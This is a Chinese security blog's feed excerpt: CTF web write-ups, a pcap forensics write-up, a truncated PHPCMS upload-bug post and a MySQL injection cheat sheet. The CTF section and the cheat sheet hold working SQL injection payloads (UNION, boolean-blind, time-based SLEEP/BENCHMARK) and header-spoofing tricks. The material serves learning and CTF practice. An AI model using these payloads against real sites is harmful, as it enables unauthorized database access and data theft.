class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">&lt;br&gt;&lt;br&gt;</div><div class="line">Can you authenticate to this website?</div></pre></td></tr></table></figure></p>
<p>二次解码。payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload 1:</div><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</div><div class="line"></div><div class="line">payload 2:</div><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DUTCTF&#123;PHP_is_the_best_program_language&#125;</div></pre></td></tr></table></figure></p>
<h1 id="这个看起来有点难"><a href="#这个看起来有点难" class="headerlink" title="这个看起来有点难"></a>这个看起来有点难</h1><p>经过fuzz，可以知道是整数型注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,database()</div></pre></td></tr></table></figure></p>
<p>得到表名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()</div></pre></td></tr></table></figure></p>
<p>得到列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x746869736b6579</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(k0y+SEPARATOR+0x3c62723e) FROM thiskey</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whatiMyD91dump</div></pre></td></tr></table></figure></p>
<h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/phpaudit/</div></pre></td></tr></table></figure>
<p>题目提供了源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line"><span class="keyword">else</span></div><div class="line">	$cip = <span class="string">"0.0.0.0"</span>;</div><div class="line"><span class="keyword">return</span> $cip;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$GetIPs = GetIP();</div><div class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>抓包，添加X-Forwarded-For: 1.1.1.1</p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SimCTF&#123;daima_shengji&#125;</div></pre></td></tr></table></figure></p>
<h1 id="猫捉老鼠"><a href="#猫捉老鼠" class="headerlink" title="猫捉老鼠"></a>猫捉老鼠</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/6.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#WWWnsf0cus_NET#</div></pre></td></tr></table></figure>
<h1 id="forbiden"><a href="#forbiden" class="headerlink" title="forbiden"></a>forbiden</h1><p>题目说:Make sure you are in HongKong<br>抓包，修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Accept-Language: zh-hk</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">123JustUserAGent</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验吧-web-writeup（持续更新）&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2015-Peers-writeup</title>
    <link href="http://yoursite.com/2017/07/23/0ctf-2015-Peers-writeup/"/>
    <id>http://yoursite.com/2017/07/23/0ctf-2015-Peers-writeup/</id>
    <published>2017-07-23T04:46:21.000Z</published>
    <updated>2017-07-28T07:22:42.263Z</updated>
    
    <content type="html"><![CDATA[<p>0ctf-2015-Peers-writeup<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目提供了一个流量包peers.pcapng，<br>peers.pcapng:<br>链接：<a href="http://pan.baidu.com/s/1nuGXACL" target="_blank" rel="external">http://pan.baidu.com/s/1nuGXACL</a> 密码：zwl3</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用wireshark的追踪tcp流查看。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/1.jpg?raw=true" alt=""></p>
<p>可以看到这是关于BitTorrent协议的包。wireshark中有针对BitTorrent protocol的协议解析器。但该解析器默认是工作在端口6881上，这也是BitTorrent protocol工作的常用端口。而在题目提供的流量包中，这些流量是通过80端口的，所以我们需要对流量包进行“修正”。</p>
<h2 id="改端口"><a href="#改端口" class="headerlink" title="改端口"></a>改端口</h2><p>我们可以利用<a href="http://tcpreplay.synfin.net/wiki/tcprewrite" target="_blank" rel="external">tcprewrite</a>这个工具来修改流量包。为把端口80修改为端口6881，使用下述命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcprewrite --portmap=80:6881 --infile=peers.pcapng --outfile=peers_output.pcap</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/2.jpg?raw=true" alt=""></p>
<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>接下去就是把这些BitTorrent的内容提取出来，：）可以手动提取。比如在过滤器处先填入<code>bittorrent.piece.index &gt;= 0</code>，之后将三十九个数据包按照index的顺序将<code>bittorrent.piece.data</code>的十六进制复制到hex编辑器中。</p>
<p>也可以利用工具<a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="external">tshark</a>。使用下面命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r peers_output.pcap -Y &apos;bittorrent.piece.data&apos; -Tfields -e bittorrent.piece.index -e bittorrent.piece.data &gt; pieces</div></pre></td></tr></table></figure></p>
<p><code>-r</code>选项表示读入一个文件，<code>-Y</code>是用于选择过滤器，<code>-Tfilelds</code>用来设置输出格式。<code>-e</code>选项表示要列出的内容，因为我们最后要根据index来对data进行排序重组，所以有两个<code>-e</code>。最后我们将文件流保存到文件<code>pieces</code>中。</p>
<p>文件<code>pieces</code>内容如下，第一列是index，第二个是对应的data：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x00000000	42:4d:36:c4:09:00:00.....</div><div class="line">0x00000020	69:ff:ae:84:78:ff:a6.....</div><div class="line">0x00000017	5b:ff:96:66:5a:ff:9a.....</div><div class="line">省略</div></pre></td></tr></table></figure></p>
<h2 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h2><p>接下去，就是根据index的顺序重组文件，用下面的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">temp = &#123;&#125;</div><div class="line">peer = open(<span class="string">"pieces"</span>,<span class="string">"rb"</span>)</div><div class="line">result = open(<span class="string">"result"</span>,<span class="string">"w+"</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> peer:</div><div class="line">	index = int(line[<span class="number">0</span>:<span class="number">10</span>],<span class="number">16</span>)</div><div class="line">	data   = line[<span class="number">11</span>:<span class="number">-1</span>].replace(<span class="string">":"</span>,<span class="string">""</span>).decode(<span class="string">"hex"</span>)</div><div class="line">	temp[index] = data</div><div class="line">peer.close()</div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> sorted(temp):</div><div class="line">	result.write(temp[index])</div><div class="line">result.close()</div></pre></td></tr></table></figure></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop<span class="comment"># python peer.py</span></div><div class="line">root@chybeta:~/Desktop<span class="comment"># file result</span></div><div class="line">result: PC bitmap, Windows 3.x format, 800 x 200 x 32</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/3.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0ctf-2015-Peers-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>PHPCMS v9.6.0 任意文件上传漏洞分析</title>
    <link href="http://yoursite.com/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/07/22/PHPCMS-v9-6-0-任意文件上传漏洞分析/</id>
    <published>2017-07-22T13:02:14.000Z</published>
    <updated>2017-07-26T11:40:51.646Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在服务器上准备好要上传的文件，比如shell.txt。其访问地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/shell.txt</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;p&gt;在服务器上准备好要上传的文件，比如shell.txt。其访问地址为：&lt;br&gt;&lt;figure class=&quot;highlight
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>MySql注入备忘录</title>
    <link href="http://yoursite.com/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://yoursite.com/2017/07/21/MySql注入备忘录/</id>
    <published>2017-07-21T06:43:02.000Z</published>
    <updated>2017-07-23T07:24:04.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br><a id="more"></a></p>
<h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h2><ul>
<li>VERSION()</li>
<li>@@VERSION</li>
<li>@@GLOBAL.VERSION</li>
</ul>
<h2 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h2><ul>
<li>USER()</li>
<li>CURRENT_USER()</li>
<li>SYSTEM_USER()</li>
<li>SESSION_USER()</li>
</ul>
<h2 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h2><ul>
<li>DATABASE()</li>
<li>SCHEMA()</li>
</ul>
<h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><ul>
<li>@@BASEDIR : mysql安装路径：</li>
<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
<li>@@DATADIR : 数据存储路径：</li>
<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
<li>@@LOG_ERROR : 错误日志文件路径：</li>
<li>@@PID_FILE : pid-file文件路径</li>
<li>@@BASEDIR : mysql安装路径：</li>
<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
</ul>
<h2 id="联合数据"><a href="#联合数据" class="headerlink" title="联合数据"></a>联合数据</h2><ul>
<li>CONCAT()</li>
<li>GROUP_CONCAT()</li>
<li>CONCAT_WS()</li>
</ul>
<h2 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h2><ul>
<li>ASCII(): 获取字母的ascii码值</li>
<li>BIN(): 返回值的二进制串表示</li>
<li>CONV(): 进制转换</li>
<li>FLOOR()</li>
<li>ROUND()</li>
<li>LOWER()：转成小写字母</li>
<li>UPPER(): 转成大写字母</li>
<li>HEX():十六进制编码</li>
<li>UNHEX()：十六进制解码</li>
</ul>
<h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><ul>
<li>MID()</li>
<li>LEFT()</li>
<li>SUBSTR()</li>
<li>SUBSTRING()</li>
</ul>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><ul>
<li>— -  (—后面有个空格)<ul>
<li>DROP sampletable;—</li>
</ul>
</li>
<li>#<ul>
<li>DROP sampletable;#</li>
</ul>
</li>
<li>` (反引号)</li>
</ul>
<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><ul>
<li>/* */<br>  +DROP/* 内容 */sampletable;</li>
<li>/*! 语句  */<ul>
<li>/*! select * from test */</li>
<li>语句会被执行</li>
</ul>
</li>
</ul>
<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>假设有: www.test.com/chybeta.php?id=1</p>
<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1+1</div><div class="line">chybeta.php?id=-1 or 1=1</div><div class="line">chybeta.php?id=-1 or 10-2=8</div><div class="line">chybeta.php?id=1 and 1=2</div><div class="line">chybeta.php?id=1 and 1=1</div></pre></td></tr></table></figure>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>参数被引号包围，我们需要闭合引号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1&apos;</div><div class="line">chybeta.php?id=1&quot;</div><div class="line">chybeta.php?id=1&apos; and &apos;1&apos;=&apos;1</div><div class="line">chybeta.php?id=1&quot; and &quot;1&quot;=&quot;1</div></pre></td></tr></table></figure></p>
<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="查询列数"><a href="#查询列数" class="headerlink" title="查询列数"></a>查询列数</h3><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p>
<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT null,null,null #</div></pre></td></tr></table></figure>
<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>利用二分法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ORDER BY 10 #</div><div class="line">ORDER BY 5  #</div><div class="line">ORDER BY 2  #</div><div class="line">....</div></pre></td></tr></table></figure></p>
<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #</div></pre></td></tr></table></figure>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</div></pre></td></tr></table></figure>
<p>假设获取到数据库名为”databasename”后，对其进行十六进制编码得到0x64617461626173656e616d65。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #</div></pre></td></tr></table></figure></p>
<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>由前一步获取到表名为tablename后，对其进行十六进制编码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #</div></pre></td></tr></table></figure></p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #</div></pre></td></tr></table></figure>
<h2 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert/update/delete注入"></a>insert/update/delete注入</h2><p>参考：<a href="https://www.exploit-db.com/docs/33253.pdf" target="_blank" rel="external">SQL Injection in Insert Update and Delete Statements</a><br>假设后台语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">insert into user(id,name,pass) values (1,&quot;chybeta&quot;,&quot;123456&quot;);</div></pre></td></tr></table></figure></p>
<h2 id="order-by后注入"><a href="#order-by后注入" class="headerlink" title="order by后注入"></a>order by后注入</h2><p>此部分整理自<a href="http://static.hx99.net/static/drops/tips-123.html" target="_blank" rel="external">瞌睡龙:MySql注入科普</a></p>
<p>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p>
<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
<p>原始链接：<a href="http://www.test.com/list.php?order=vote" target="_blank" rel="external">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
<p>找到投票数最大的票数num然后构造以下链接，看排序是否变化。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</div></pre></td></tr></table></figure></p>
<p>还有一种方法不需要知道任何字段信息，使用rand函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">list.php?order=rand(true)</div><div class="line">list.php?order=rand(false)</div></pre></td></tr></table></figure></p>
<p>以上两个会返回不同的排序。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>判断表名中第一个字符是否小于128的语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))</div></pre></td></tr></table></figure></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="盲注场景"><a href="#盲注场景" class="headerlink" title="盲注场景"></a>盲注场景</h3><p>在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</p>
<ul>
<li>正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</li>
<li>正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</li>
<li>提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</li>
</ul>
<p>几种简单的判断语句，在真实利用中需要根据情况而变化:</p>
<ul>
<li>CASE</li>
<li>IF()</li>
<li>IFNULL()</li>
<li>NULLIF()</li>
</ul>
<h3 id="布尔盲注-基于响应"><a href="#布尔盲注-基于响应" class="headerlink" title="布尔盲注-基于响应"></a>布尔盲注-基于响应</h3><p>提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</div><div class="line">// k ，结合limit，选择偏移为k的行</div><div class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</div><div class="line">// SUBSTR() 也可以换成 SUBSTRING()</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>脚本利用，可见：<a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95" target="_blank" rel="external">ctf盲注利用脚本</a><br>要点：</p>
<ul>
<li>注意编码问题</li>
<li>注意异常处理</li>
<li>注意边界处理</li>
</ul>
<h3 id="延时盲注-基于时间"><a href="#延时盲注-基于时间" class="headerlink" title="延时盲注-基于时间"></a>延时盲注-基于时间</h3><p>一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</p>
<ul>
<li>SLEEP(n) 让mysql停n秒钟</li>
<li>BENCHMARK(count,expr) 重复countTimes次执行表达式expr</li>
</ul>
<p>一些注意事项：</p>
<ul>
<li>使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</li>
<li>时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</li>
<li>当在页面上看不到任何明显变化时，再考虑选择使用延时注入。</li>
</ul>
<h4 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1&apos; OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">&apos;) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">SELECT SLEEP(25) #</div></pre></td></tr></table></figure>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</div><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
